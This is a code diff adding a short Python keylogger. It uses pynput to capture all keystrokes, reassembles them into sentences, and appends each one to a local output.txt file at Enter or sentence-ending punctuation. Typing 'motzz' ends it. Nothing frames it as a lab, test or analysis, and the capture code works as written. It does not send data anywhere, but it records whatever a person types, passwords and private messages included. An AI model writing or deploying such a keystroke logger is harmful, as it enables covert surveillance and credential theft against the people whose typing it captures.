@@ -1,0 +1,40 @@
+from pynput import keyboard
+
+print("Ready")
+resultat = ""
+phrases = ""
+
+def on_press(key):
+    global phrases, resultat
+    try:
+        if key == keyboard.Key.backspace:
+            phrases = phrases[:-1]
+        elif hasattr(key, 'char') and key.char is not None:
+            phrases += key.char
+            if phrases[-5:] == "motzz":
+                quit()
+        elif hasattr(key, 'vk') and 48 <= key.vk <= 57:
+            # Gérer les chiffres du pavé numérique
+            phrases += chr(key.vk)
+        else:
+            phrases += " "
+    except AttributeError:
+        pass
+
+def on_release(key):
+    global phrases, resultat
+    if key == keyboard.Key.enter or key == keyboard.KeyCode(char='.') or key == keyboard.KeyCode(char='?') or key == keyboard.KeyCode(char='!'):
+        save_to_file(phrases)
+        print(phrases)
+        resultat = resultat + phrases
+        phrases = ""
+
+def save_to_file(data):
+    try:
+        with open("output.txt", "a") as file:
+            file.write(data + "\n")
+    except Exception as e:
+        print(f"Error saving to file: {e}")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
